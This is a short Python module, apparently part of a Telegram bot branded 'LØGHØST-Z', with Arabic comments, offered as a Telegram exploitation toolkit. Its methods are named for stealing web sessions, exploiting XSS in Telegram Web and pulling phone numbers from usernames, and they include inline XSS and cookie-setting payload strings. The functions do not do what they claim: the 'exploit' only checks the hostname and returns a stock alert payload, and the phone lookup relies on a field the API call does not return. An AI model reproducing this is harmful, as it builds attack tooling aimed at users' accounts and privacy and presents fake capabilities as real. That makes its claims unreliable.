#!/usr/bin/env python3
# 🔱 LØGHØST-Z 💀 – وحدة استغلال تيليجرام (معدلة لتجنب التعارض)

import requests
import json
import re
from urllib.parse import urlparse

# تم تغيير اسم الكلاس لتجنب التعارض مع مكتبة telegram
class TelegramExploitUtils:
    def __init__(self, bot_token):
        self.bot_token = bot_token
        self.api_url = f"https://api.telegram.org/bot{bot_token}"

    def get_user_info(self, user_id):
        try:
            response = requests.get(f"{self.api_url}/getChat", params={"chat_id": user_id})
            return response.json()
        except:
            return None

    def send_message(self, chat_id, text):
        try:
            response = requests.post(
                f"{self.api_url}/sendMessage",
                json={"chat_id": chat_id, "text": text}
            )
            return response.json()
        except:
            return None

    def steal_web_session(self, session_cookie):
        try:
            payload = f"<script>document.cookie='{session_cookie}'</script>"
            return {"status": "success", "payload": payload}
        except:
            return None

    def exploit_telegram_xss(self, target_url):
        try:
            parsed = urlparse(target_url)
            if "web.telegram.org" in parsed.netloc:
                return {
                    "status": "vulnerable",
                    "payload": "<img src=x onerror=alert('XSS')>",
                    "target": target_url
                }
            return {"status": "safe", "target": target_url}
        except:
            return {"status": "error"}

    def get_phone_from_username(self, username):
        try:
            response = requests.get(
                f"{self.api_url}/getChat",
                params={"chat_id": f"@{username}"}
            )
            data = response.json()
            if data.get("ok"):
                return data.get("result", {}).get("phone_number", "غير متاح")
            return "غير متاح"
        except:
            return "غير متاح"

# دالة للاستخدام المباشر في البوت (تم تغيير الاسم)
async def telegram_exploit_utils(update, context):
    user = update.effective_user
    await update.message.reply_text(
        "✈️ **استغلال Telegram**\n\n"
        "📌 يتم استغلال ثغرة XSS في Telegram Web.\n"
        "⚠️ هذه الخدمة قيد التطوير.",
        parse_mode="Markdown"
    )
